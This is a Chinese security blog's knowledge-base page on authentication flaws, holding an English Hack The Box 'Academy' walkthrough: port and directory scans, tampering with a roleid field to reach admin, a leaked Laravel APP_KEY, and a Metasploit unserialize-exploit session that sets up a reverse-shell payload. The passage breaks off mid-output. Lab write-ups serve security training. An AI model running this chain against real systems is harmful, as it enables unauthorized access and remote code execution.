---
title: 认证状态、JWT 与访问控制
url: https://lucifer11.xyz/knowledge/identity/
source: 0xfd's blog
date: 2026-11-25
fetch_date: 2026-11-26T10:13:57.463715
---

# 认证状态、JWT 与访问控制

![0xfd's blog](/images/fifteen-katana-zero-katana-zero.gif)
[0xfd's blog](/)

by 0xfd

* [首页](/)
* [知识库](/knowledge/)
* [导读](/guide/)
* [分类](/categories/)
* [标签](/tags/)
* [归档](/archives/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [分析重点](#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9)
2. [案例与技术索引](#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95)
3. [角色字段、框架密钥与审计日志](#%E8%A7%92%E8%89%B2%E5%AD%97%E6%AE%B5%E3%80%81%E6%A1%86%E6%9E%B6%E5%AF%86%E9%92%A5%E4%B8%8E%E5%AE%A1%E8%AE%A1%E6%97%A5%E5%BF%97)
4. [文件读取、会话构造与本地凭据](#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E3%80%81%E4%BC%9A%E8%AF%9D%E6%9E%84%E9%80%A0%E4%B8%8E%E6%9C%AC%E5%9C%B0%E5%87%AD%E6%8D%AE)
5. [多层认证与加密状态](#%E5%A4%9A%E5%B1%82%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%8A%A0%E5%AF%86%E7%8A%B6%E6%80%81)
6. [Padding Oracle 与任务身份](#Padding-Oracle-%E4%B8%8E%E4%BB%BB%E5%8A%A1%E8%BA%AB%E4%BB%BD)
7. [ViewState 密钥与 CBC 状态](#ViewState-%E5%AF%86%E9%92%A5%E4%B8%8E-CBC-%E7%8A%B6%E6%80%81)
8. [响应跳转与真实服务端授权](#%E5%93%8D%E5%BA%94%E8%B7%B3%E8%BD%AC%E4%B8%8E%E7%9C%9F%E5%AE%9E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%8E%88%E6%9D%83)
9. [JWT 的签名密钥来源与管理员声明](#JWT-%E7%9A%84%E7%AD%BE%E5%90%8D%E5%AF%86%E9%92%A5%E6%9D%A5%E6%BA%90%E4%B8%8E%E7%AE%A1%E7%90%86%E5%91%98%E5%A3%B0%E6%98%8E)

![253](/images/fifteen-katana-zero-katana-zero.gif)

253

漏洞分析、利用机制、二进制研究与安全工程

[83
日志](/archives/)

[65
分类](/categories/)

[312
标签](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

链接

* atsud0
* 记忆里的纯真
* 小离

# 认证状态、JWT 与访问控制

发表于
2026-11-25

分类于

[Web安全](/categories/Web%E5%AE%89%E5%85%A8/)
，
[认证与会话](/categories/Web%E5%AE%89%E5%85%A8/%E8%AE%A4%E8%AF%81%E4%B8%8E%E4%BC%9A%E8%AF%9D/)

阅读次数：

本文字数：
18k

阅读时长 ≈
1:05

认证缺陷经常出现在状态的生成、签名、传递和使用之间。本章以原案例对照角色字段、JWT 密钥来源、会话标识、ViewState 和填充侧信道。每个案例的请求、返回值与身份变化都可展开核查。

认证缺陷经常出现在状态的生成、签名、传递和使用之间。本章以原案例对照角色字段、JWT 密钥来源、会话标识、ViewState 和填充侧信道。每个案例的请求、返回值与身份变化都可展开核查。

[知识库目录](/knowledge/)
[研究导读](/guide/)
[下载 Markdown](/knowledge/identity/source.md)
展开全部技术记录

## 分析重点

Academy、Previse 的服务端权限判断与页面跳转各有边界，页面可见性和操作权限需要分别验证。

TheNotebook、Breadcrumbs、Fingerprint 的签名材料和角色字段不同，原载荷保留各自依赖。

Perspective 与 Overflow 分别记录 CBC 状态修改和 Padding Oracle，IV、块位置与响应差异应随原文阅读。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [角色字段、框架密钥与审计日志](#case-academy) | academy | 访问控制、Laravel、凭据泄露、sudo |
| [文件读取、会话构造与本地凭据](#case-breadcrumbs) | breadcrumbs | JWT、LFI、SQLite、逆向 |
| [多层认证与加密状态](#case-fingerprint) | fingerprint | JWT、HQL、ECB、访问控制 |
| [Padding Oracle 与任务身份](#case-overflow) | overflow | Padding Oracle、ExifTool、逆向 |
| [ViewState 密钥与 CBC 状态](#case-perspective) | Perspective | ViewState、CBC、XSS |
| [响应跳转与真实服务端授权](#case-previse) | previse | 访问控制、命令注入、PATH |
| [JWT 的签名密钥来源与管理员声明](#case-thenotebook) | TheNotebook | JWT、访问控制、容器逃逸 |

## 角色字段、框架密钥与审计日志

注册请求中的 roleid 改变权限边界，随后由 Laravel 配置与审计日志恢复凭据，再经 composer 的 sudo 权限完成提权。三个阶段分别保留了请求、编码还原和执行记录。

来源 academy · 原记录 2020-11-14 · 15 个代码块 · 4 处图片引用

查看分析过程、攻击步骤与完整代码

#### introduce

OS: Linux
Difficulty: Easy
Points: 20
Release: 07 Nov 2020
IP: 10.10.10.215

User Blood snowscan 00 days, 00 hours, 21 mins, 04 seconds.
Root Blood jkr 00 days, 00 hours, 47 mins, 31 seconds.

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb119.jpg)
* ![my htb rank](http://www.hackthebox.eu/badge/image/235857)

#### information gathering

first use nmap as usaul

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` root@kali:~/hackthebox/machine/academy# nmap -sV -p- -v --min-rate=10000 10.10.10.215 PORT      STATE    SERVICE VERSION 22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu)) 13723/tcp filtered unknown 23564/tcp filtered unknown 26345/tcp filtered unknown 33060/tcp open     mysqlx? 55696/tcp filtered unknown ``` |

add 10.10.10.215 academy.htb to /etc/hosts

Let’s go to register page.

Before click on register page let’s capture this request in burpsuite.

There is a role id.

Let’s change it to 1 and forward the request.

Let’s go and login in the wepsite.

There is so many courses.

now use gobuster.

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ``` | ``` root@kali:~/hackthebox/machine/academy# gobuster dir -u http://academy.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -x php =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url:            http://academy.htb/ [+] Threads:        50 [+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Status codes:   200,204,301,302,307,401,403 [+] User Agent:     gobuster/3.0.1 [+] Extensions:     php [+] Timeout:        10s =============================================================== 2020/11/14 03:11:28 Starting gobuster =============================================================== /images (Status: 301) /home.php (Status: 302) /login.php (Status: 200) /index.php (Status: 200) /register.php (Status: 200) /admin.php (Status: 200) /config.php (Status: 200) ``` |

There is a admin.php let’s go to this directory real quick.

login in with the same credentials which we use in login.php.

there is a academy launch pannel.

But we find another sub-domain dev-staging-01.academy.htb.

Let’s add this in our /etc/hosts file.

Let’s to to that sub-domain.

find two useful thing.

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` 1. app_name = Laravel 2. app_key = "base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=" ``` |

search on google that there is any exploit of Laravel and i found one.

* PHP Laravel Framework token Unserialize Remote Command Execution

the rapid7 website tell how to exploit it with metasploit.

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ``` | ``` msf5 > use exploit/unix/http/laravel_token_unserialize_exec [*] Using configured payload cmd/unix/reverse_perl msf5 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= msf5 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 10.10.10.215 RHOSTS => 10.10.10.215 msf5 exploit(unix/http/laravel_token_unserialize_exec) > set VHOST dev-staging-01.academy.htb VHOST => dev-staging-01.academy.htb msf5 exploit(unix/http/laravel_token_unserialize_exec) > set LHOST tun0 LHOST => tun0 msf5 exploit(unix/http/laravel_token_unserialize_exec) > show options  Module options (exploit/unix/http/laravel_token_unserialize_exec):     Name       Current Setting                               Required  Description    ----       ---------------                               --------  -----------    APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file    Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]    RHOSTS     10.10.10.215                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT      80                                            yes       The target port (TCP)    SSL        false                                         no        Negotiate SSL/TLS for outgoing connections    TARGETURI  /                                             yes       Path to target webapp    VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host   Payload options (cmd/unix/reverse_perl):     Name   Current Setting  Required  Description    ----   ---------------  --------  -----------    LHOST  tun0             yes       The listen address (an interface may be specified)    ...